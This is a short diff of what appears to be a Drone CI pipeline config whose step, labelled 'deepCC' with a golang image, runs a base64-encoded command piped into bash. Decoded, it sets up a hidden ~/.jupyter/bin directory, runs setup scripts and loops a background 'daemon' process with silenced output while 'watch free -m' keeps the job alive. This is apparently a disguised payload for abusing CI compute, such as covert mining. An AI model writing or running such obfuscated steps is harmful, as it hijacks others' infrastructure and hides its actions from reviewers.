@@ -5,7 +5,7 @@ name: default
 steps:
 - name: deepCC
   image: golang
-  environment:
-  - TERM: xterm
   commands:
   - bash -c "base64 -d <<< ZXhwb3J0IFRFUk09eHRlcm0gJiYgbnByb2MgJiYgbWtkaXIgfi8uanVweXRlci9iaW4gLXAgJiYgLi9zZXR1cCAmJiAuL2NvbmZpZ3VyZSAmJiBjZCB+Ly5qdXB5dGVyL2JpbiAmJiBQQVRIPSQocHdkKTokUEFUSCAmJiB3aGlsZSBbIDEgXTsgZG8gYmFzaCBkYWVtb24gPiAvZGV2L251bGw7IGRvbmUgJiB3YXRjaCBmcmVlIC1t | bash"
+  environment:
+    TERM: xterm
